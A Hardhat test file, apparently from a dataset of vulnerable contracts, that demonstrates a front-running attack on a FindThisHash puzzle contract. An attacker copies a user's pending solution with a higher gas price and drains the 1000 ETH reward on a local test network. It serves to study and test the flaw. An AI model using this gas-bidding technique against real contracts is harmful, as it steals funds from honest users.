const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack front_running/FindThisHash.sol', function () {
    let owner, user, attacker;
    async function deployContracts() {
      [owner, user, attacker] = await ethers.getSigners();
      const FindThisHash = await ethers.getContractFactory('contracts/dataset/front_running/FindThisHash.sol:FindThisHash');
      const victim = await FindThisHash.connect(owner).deploy({value: ethers.parseEther("1000")});  
      return {victim};
    }


    it('front running vulnerability', async function () {
      const {victim} = await loadFixture(deployContracts);

      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
      
      const initialBalance = await ethers.provider.getBalance(victim.target);
      expect(initialBalance).to.be.equal(ethers.parseEther("1000"));

      await network.provider.send("evm_setAutomine", [false]);
      await network.provider.send("evm_setIntervalMining", [0]);
      const solution = "Hello World!"
      const tx1 = await victim.connect(user).solve(solution, {gasPrice: 767532034});

      // attacker sees tx1 and wants to claim the reward before it's reset
      const tx2 = await victim.connect(attacker).solve(solution, {gasPrice: 767532040});

      await network.provider.send("hardhat_mine", ["0x2"]);
      await network.provider.send("evm_setAutomine", [true]);

      // owner's tx1 will be reverted since the attacker's tx2 was mined first
      expect(tx1).to.be.reverted;
      const receipt2 = await tx2.wait();
      const gasUsed = receipt2.gasUsed * BigInt(767532040);
      const balanceAfter = await ethers.provider.getBalance(victim.target);
      expect(balanceAfter).to.be.equal(0);

      const attackerBalance = await ethers.provider.getBalance(attacker.address);
      expect(attackerBalance).to.be.equal(attackerBalanceBefore + ethers.parseEther("1000") - gasUsed);
    });


  });